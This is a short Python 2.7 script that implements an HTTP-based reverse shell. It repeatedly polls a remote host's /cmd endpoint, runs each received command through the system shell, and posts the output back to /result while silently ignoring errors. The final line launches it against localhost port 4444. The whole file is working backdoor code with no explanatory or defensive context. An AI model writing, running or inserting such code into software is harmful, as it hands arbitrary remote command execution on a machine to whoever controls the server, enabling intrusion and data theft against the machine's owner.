#!/usr/bin/env python2.7

def reverse(addr, port, schema='http'):
    import urllib2
    import commands
    import time
    G = {'idx': 0}
    host = '%s://%s:%s' % (schema, addr, port)
    def do_cmd():
        resp = urllib2.urlopen(host+'/cmd')
        seq, cmd = resp.read().split(',', 1)
        seq = int(seq)

        if G['idx'] > seq:
            G['idx'] = seq
            return

        if G['idx'] == seq:
            return

        if G['idx'] < seq - 1:
            G['idx'] = seq
            return

        _, output = commands.getstatusoutput(cmd)
        result = '%s,%s' % (seq, output)
        urllib2.urlopen(urllib2.Request(
            host+'/result',
            result,
            {'content-type': 'text/html; charset=utf-8'}))
        G['idx'] = seq
    def execute():
        while True:
            try: do_cmd()
            except: pass
            time.sleep(1)
    return execute

reverse('localhost', 4444)()
